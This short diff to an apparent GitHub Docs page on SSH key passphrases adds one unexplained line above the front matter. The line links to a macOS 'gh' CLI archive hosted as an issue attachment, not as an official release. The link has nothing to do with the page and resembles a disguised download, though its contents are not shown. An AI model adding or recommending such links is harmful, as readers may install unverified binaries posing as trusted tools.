@@ -1,3 +1,4 @@
+[gh_2.4.0_macOS_amd64.tar.gz](https://github.com/github/docs/files/7773134/gh_2.4.0_macOS_amd64.tar.gz)
 ---
 title: Working with SSH key passphrases
 intro: You can secure your SSH keys and configure an authentication agent so that you won't have to reenter your passphrase every time you use your SSH keys.
